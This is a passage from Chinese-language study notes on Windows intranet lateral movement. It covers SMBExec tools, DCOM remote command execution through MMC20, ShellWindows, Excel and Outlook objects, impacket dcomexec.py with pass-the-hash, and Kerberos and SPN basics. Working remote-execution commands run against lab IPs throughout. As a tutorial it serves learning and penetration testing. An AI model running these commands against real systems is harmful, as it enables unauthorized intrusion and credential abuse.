<pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="SMBExec的使用">SMBExec的使用</h2>
<p>smbexe可以通过文件共享（admin$、c$、ipc$、d$）在远程系统中执行命令</p>
<p>所以，<mark>使用SMBExec时，目标系统的共享服务必须是开放的（如admin$、c$、ipc$、d$）</mark></p>
<h4 id="C-版smbexec">C++ 版smbexec</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a></p>
<p>很老的工具了，而且已经被市面上的杀软标记，没有什么学习价值，此处仅作为记录。</p>
<h4 id="impacket工具包中的smbexec-py脚本">impacket工具包中的smbexec.py脚本</h4>
<pre class="line-numbers language-none"><code class="language-none">python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7
#如果用户密码中有@符号（如此处的密码为1qaz@WSX），可能导致命令提前闭合截断，可以使用反斜杠进行转义，如下
python3 smbexec.py teamssix.com&#x2F;administrator:1qaz@WSX\@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117233226069.png" alt="image-20231117233226069"></p>
<h4 id="smbexec工具包">smbexec工具包</h4>
<p><mark>使用smbexec工具包，可以实现Linux 跨平台 Windows 远程命令执行</mark></p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
<p>此处演示安装，以kali为例</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.git
#git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;brav0hax&#x2F;smbexec.git
cd smbexec&#x2F;
chmod +x install.sh
sudo .&#x2F;install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>安装时需要选择操作系统，根据自己情况选择就行，如果是 Kali 就选择 Debain，然后选择安装目录，直接回车默认 /opt 目录即可</p>
<p>安装完后，在终端里输入 smbexec 就会显示 smbexec 的主菜单，分别如下：</p>
<pre class="line-numbers language-none"><code class="language-none">1. System Enumeration   &#x2F;&#x2F; 获取系统信息
2. System Exploitation  &#x2F;&#x2F; 执行系统命令
3. Obtain Hashes        &#x2F;&#x2F; 获取系统哈希
4. Options              &#x2F;&#x2F; 一些其他操作
5. Exit                 &#x2F;&#x2F; 退出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择菜单 1 System Enumeration 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Create a host list                 &#x2F;&#x2F; 扫描目标 IP 段中存活的主机
2. Check systems for Domain Admin     &#x2F;&#x2F; 获取目标系统中的管理员
3. Check systems for logged in users  &#x2F;&#x2F; 获取当前登录目标系统的用户
4. Check systems for UAC              &#x2F;&#x2F; 获取目标系统 UAC 的状态
5. Enumerate Shares                   &#x2F;&#x2F; 获取目标系统中的网络共享目录
6. File Finder                        &#x2F;&#x2F; 搜索目标系统中的敏感文件
7. Remote login validation            &#x2F;&#x2F; 获取目标系统中远程登录的用户
8. Main menu                          &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择菜单 2 System Exploitation 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Create an executable and rc script    &#x2F;&#x2F; 生成一个 meterpreter Payload 并在目标系统中运行它
2. Disable UAC                           &#x2F;&#x2F; 关闭远程主机的 UAC
3. Enable UAC                            &#x2F;&#x2F; 开启远程主机的 UAC
4. Execute Powershell                    &#x2F;&#x2F; 执行一个 PowerShell 脚本
5. Get Shell                             &#x2F;&#x2F; 使用基于 PsExec 的方式获得目标系统的 Shell
6. In Memory Meterpreter via Powershell  &#x2F;&#x2F; 通过 PowerShell 在内存中插入 Meterpreter Payload
7. Remote system access                  &#x2F;&#x2F; 远程访问系统
8. Main menu                             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择菜单 3 Obtain Hashes 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Domain Controller            &#x2F;&#x2F; 获取域控哈希
2. Workstation &amp; Server Hashes  &#x2F;&#x2F; 获取本地哈希
3. Main menu                    &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>选择菜单 4 Options 有以下选项：</p>
<pre class="line-numbers language-none"><code class="language-none">1. Save State            &#x2F;&#x2F; 保存当前状态
2. Load State            &#x2F;&#x2F; 加载以前保存的状态
3. Set Thread Count      &#x2F;&#x2F; 设置线程数
4. Generate SSL Cert     &#x2F;&#x2F; 生成 SSL 证书
5. Enter Stealth Mode    &#x2F;&#x2F; 进入安静模式
6. About                 &#x2F;&#x2F; 关于
7. Main menu             &#x2F;&#x2F; 返回主菜单<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>获取目标系统 UAC 的状态</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117234828983.png" alt="image-20231117234828983"></p>
<p>获取目标系统中的网络共享目录</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117234924553.png" alt="image-20231117234924553"></p>
<p>获取本地哈希</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231117234950459.png" alt="image-20231117234950459"></p>
<p>详细演示：</p>
<ol>
<li>主菜单项1——用于列举系统中的重要信息System Enumeration</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113417751.png" alt="image-20231118113417751"></p>
<p>选项1用于扫描目标网络IP地址段中存活的主机。</p>
<pre class="line-numbers language-none"><code class="language-none">Choice : 1
Enter target network range [172.27.7.0&#x2F;24] : 10.1.1.0&#x2F;24 #直接回车就是[]里的，括号没有或者在后面10.1.1.0&#x2F;24像这样格式输入指定地址段扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113355630.png" alt="image-20231118113355630"></p>
<p>选项2用于列举目标系统中的管理员用户。需要输入IP地址、用户名、密码、域四项。IP地址可以直接调用由选项1扫描出来的IP，用户名、密码、域需要手动添加，程序会记录最近输入的用户名密码等以便下次使用</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113340757.png" alt="image-20231118113340757"></p>
<p>选项3用于列举当前登录目标系统的用户，用户名、密码、域三项会自动加载最近输入的内容。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113255127.png" alt="image-20231118113255127"></p>
<p>选项4用于列举目标系统UAC的状态。在本实验中，目标网络中的IP地址10.1.1.23所对应的机器的UAC的状态都是Enabled (启用)</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113440676.png" alt="image-20231118113440676"></p>
<p>选项5用于对目标系统中的网络共享目录进行列举。在本实验中，列出了IP地址所对应的机器的共享目录</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113515117.png" alt="image-20231118113515117"></p>
<p>选项6用于在目标系统中搜索敏感文件，例如配置文件、密码信息、缓存文件等</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113557365.png" alt="image-20231118113557365"></p>
<p>选项7用于列举远程登录目标主机的用户。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113631767.png" alt="image-20231118113631767"></p>
<p>选项8用于直接返回主菜单。会展现前面七步的结果</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113712165.png" alt="image-20231118113712165"></p>
<ol start="2">
<li>主菜单项2——用于在目标系统中执行命令、获取权限等。</li>
</ol>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118113909054.png" alt="image-20231118113909054"></p>
<p>选项1用于生成一个meterpreter Pyload,并在目标系统中直接运行它。在渗透测试中，也可以使用Masploit、 Empire、CobaltStike建立一个监听并获得一个shell</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118114019871.png" alt="image-20231118114019871"></p>
<p>选项2用于直接关闭远程主机的UAC。网络管理员可以通过攻击者关闭UAC的操作发现系统正在遭受攻击。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118114049751.png" alt="image-20231118114049751"></p>
<p>选项3的功能是在执行选项2关闭目标系统的UAC后，重新打开目标系统的UAC，使目标系统复原</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118114136087.png" alt="image-20231118114136087"></p>
<p>选项4用于执行一个PowerShell脚本。</p>
<p>选项5使用基于PsExec的方式获得目标系统的一个System权限的Shell</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118114227841.png" alt="image-20231118114227841"></p>
<p>除此之外，smbexec还有一个windows版本，下载链接：<a target="_blank" rel="noopener" href="https://github.com/0x7556/smbexec">https://github.com/0x7556/smbexec</a></p>
<h2 id="DCOM在远程系统中的使用">DCOM在远程系统中的使用</h2>
<h3 id="DCOM基本介绍">DCOM基本介绍</h3>
<p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p>
<p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p>
<p>DCOM（分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM是COM（组件对象模型）的扩展。它<mark>支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求</mark>。</p>
<p>攻击者可使用 DCOM 进行横向移动，<mark>通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令</mark>。</p>
<p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程（资源管理器）中执行。</p>
<p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p>
<h3 id="在本地通过-DCOM-执行命令">在本地通过 DCOM 执行命令</h3>
<h4 id="获取-DCOM-程序列表">获取 DCOM 程序列表</h4>
<p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此<mark>只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</mark></p>
<pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118141630863.png" alt="image-20231118141630863"></p>
<p>因为Windows 7、Windows Server 2008中默认安装的是Powershell 2.0，所以它们都不支持Get-Cimlnstance，可以使用 Get-WmiObject 替代 Get-CimInstance</p>
<pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118141941031.png" alt="image-20231118141941031"></p>
<h4 id="使用-DCOM-执行任意命令">使用 DCOM 执行任意命令</h4>
<p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本</p>
<p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p>
<pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><mark>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令</mark>，比如启动个计算器</p>
<pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118142647576.png" alt="image-20231118142647576"></p>
<p><mark>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用</mark></p>
<h3 id="使用-DCOM-在远程主机上执行命令">使用 DCOM 在远程主机上执行命令</h3>
<p>在使用该方法时，需要具备以下条件：</p>
<ul>
<li>具有本地管理员权限的 PowerShell</li>
<li>需要关闭目标系统的防火墙。</li>
<li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li>
</ul>
<p>下面演示如何使用 DCOM 在远程主机上执行命令：</p>
<blockquote>
<p>注意，要先建立ipc$连接远程主机</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">net use \\10.1.1.34 &#x2F;u:administrator &quot;123456&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>调用 MMC20.Application 远程执行命令</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))
$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)
或者
[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118143306066.png" alt="image-20231118143306066"></p>
<ul>
<li>调用 ShellWindows 远程执行命令</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))
$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
或者
[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)
#注意，这种方式不需要对方主机的凭据，只需要当前主机的管理员权限即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118143447558.png" alt="image-20231118143447558"></p>
<ul>
<li>调用 Excel.Application 远程执行命令</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))
$com.DisplayAlerts &#x3D; $false
$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>调用 ShellBrowserWindow 远程执行命令</li>
</ul>
<blockquote>
<p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))
$com.Document.Application.shellExecute(&quot;calc.exe&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>调用 Visio.Application 远程执行命令</li>
</ul>
<blockquote>
<p>前提是目标安装了 Visio</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))
$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>调用 Outlook.Application 远程执行命令</li>
</ul>
<blockquote>
<p>前提是目标安装了 Outlook</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))
$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)
或者
[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Impacket 工具包中的 <a target="_blank" rel="noopener" href="http://dcomexec.py">dcomexec.py</a> 脚本</li>
</ul>
<p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 <a target="_blank" rel="noopener" href="http://wmiexec.py">wmiexec.py</a> 脚本的半交互式 shell，不过使用的是 DCOM。</p>
<p><mark><a target="_blank" rel="noopener" href="http://dcomexec.py">dcomexec.py</a> 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象</mark></p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者只执行一条命令</p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果只知道 hash 也可以用 hash 去连接</p>
<pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118144150969.png" alt="image-20231118144150969"></p>
<h2 id="SPN在域环境中的利用">SPN在域环境中的利用</h2>
<h3 id="SPN基本介绍">SPN基本介绍</h3>
<p>Windows 域环境是基于微软的活动目录服务工作的，它在网络系统环境中将物理位置分散、所属部门不同的用户进行分组和集中资源，有效地对资源访问控制权限进行细粒度的分配，提高了网络环境的安全性及网络资源统一分配管理的便利性。</p>
<p>在域环境中运行的大量应用包含了多种资源，<mark>为了对资源的合理分类和再分配提供便利，微软给域内的每种资源分配了不同的服务主体名称即 SPN (Service Principal Name）</mark></p>
<h3 id="Kerberos基本介绍">Kerberos基本介绍</h3>
<blockquote>
<p>Kerberos 原意是希腊神话中看守冥界入口的恶犬刻耳柏洛斯，个人猜测作者采用这个名字也正是为了体现出该协议里身份认证的特性，即通过 Kerberos 协议守护网络通信中的安全</p>
</blockquote>
<p>Kerberos 是由 MIT(麻省理工学院) 提出的一种网络身份验证协议，旨在通过密钥加密技术为客户端/服务器应用程序提供强身份验证，它也是主要用在域环境下的身份认证协议。</p>
<p>在 Kerberos 认证中，最主要的问题就是如何证明「你是你」的问题，比如当一个用户去访问服务器上的某服务时，服务器如何判断该用户是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不会影响通讯的安全性，这正是 Kerberos 解决的问题。</p>
<p>Kerberos 协议中的名称解释：</p>
<ul>
<li>Client: 访问服务的客户端</li>
<li>Server: 提供服务的服务器</li>
<li>KDC (Key Distribution Center): 密钥分发中心</li>
<li>AS (Authentication Service): 认证服务器</li>
<li>TGS (Ticket Granting Service): 票据授予服务</li>
<li>DC (Domain Controller): 域控制器</li>
<li>AD (Account Database): 用户数据库</li>
<li>TGT (Ticket Granting Ticket): 票据授予票据</li>
<li>ST (Servre Ticket): 服务票据</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150027985.png" alt="image-20231118150027985"></p>
<p>根据上图，下面一步一步进行解释：</p>
<ol>
<li>
<p>第一阶段：Clinet 与 AS<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150227143.png" alt="image-20231118150227143"></p>
</li>
<li>
<p>第二阶段：Clinet 与 TGS<img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150526760.png" alt="image-20231118150526760"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150542441.png" alt="image-20231118150542441"></p>
</li>
<li>
<p>第三阶段：Clinet 与 Server</p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150754877.png" alt="image-20231118150754877"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150807788.png" alt="image-20231118150807788"></p>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118150958428.png" alt="image-20231118150958428"></p>
<p>注意点：</p>
<ul>
<li>KDC 服务默认会安装在一个域的域控中</li>
<li>Kerberos 认证采用对称加密算法</li>
<li>三个阶段里都使用了密钥，这些密钥都是临时生成的，也只在一次会话中生效，因此即使密钥被劫持，等到密钥被破解可能这次会话也都早已结束。</li>
<li>AD 其实是一个类似于本机 SAM 的一个数据库，全称叫 Account Database，存储所有 Client 白名单，只有存在于白名单的 Client 才能顺利申请到 TGT</li>
<li>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为它就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
</ul>
</li>
</ol>
<h3 id="SPN相关概念">SPN相关概念</h3>
<p>在使用 Kerberos 协议进行身份验证的网络中，必须在内置账号（NetworkService、LocalSystem）或者用户账号下为服务器注册 SPN。</p>
<p>对于内置账号，SPN 将自动进行注册，如果在域用户账号下运行服务，则必须为要使用的账号手动注册 SPN。</p>
<p><mark>因为域环境中的每台服务器都需要在 Kerberos 身份验证服务中注册 SPN ，所以 RedTeam 会直接向域控制器发送查询请求，获取需要的服务的 SPN ，从而知道自己需要使用的服务资源在哪台机器上</mark>。</p>
<p>SPN 格式如下：</p>
<pre class="line-numbers language-none"><code class="language-none">serviceclass &quot;&#x2F;&quot; hostname [&quot;:&quot;port] [&quot;&#x2F;&quot; servicename]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>serviceclass（必选）：服务组件名称</p>
<p>hostname（必选）：以 “/” 与后面的名称分隔，这里的 hostname 是计算机的 FQDN (完全限定域名，即同时带有计算机名和域名)</p>
<p>port（可选）：以冒号分隔，后面的内容为该服务监听的端口号</p>
<p>servicename（可选）：一个字符串，可以是服务的专有名称（DN）、objectGuid、Internet主机名或完全限定域名</p>
</blockquote>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118152035821.png" alt="image-20231118152035821"></p>
<h3 id="常见-SPN-服务">常见 SPN 服务</h3>
<p>MSSQL 服务</p>
<pre class="line-numbers language-none"><code class="language-none">MSSQLSvc&#x2F;computer1.labtest.com:1433<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>MSSOLSvc：服务组件的名称，此处为 MSSQL 服务。</li>
<li><a target="_blank" rel="noopener" href="http://computer1.labtest.com">computer1.labtest.com</a>：主机名为computer1，<a target="_blank" rel="noopener" href="http://xn--labtest-e73k064bojj.com">域名为labtest.com</a>。</li>
<li>1433：监听的端口为1433。</li>
</ul>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118152417132.png" alt="image-20231118152417132"></p>
<p>Exchange 服务</p>
<pre class="line-numbers language-none"><code class="language-none">exchangeMDB&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118152843446.png" alt="image-20231118152843446"></p>
<p>RDP 服务</p>
<pre class="line-numbers language-none"><code class="language-none">TERMSRV&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>WSMan/WinRM/PSRemoting 服务</p>
<pre class="line-numbers language-none"><code class="language-none">WSMAN&#x2F;ExServer.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118152935006.png" alt="image-20231118152935006"><img src="/2023/12/24/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20231118153013545.png" alt="image-20231118153013545"></p>
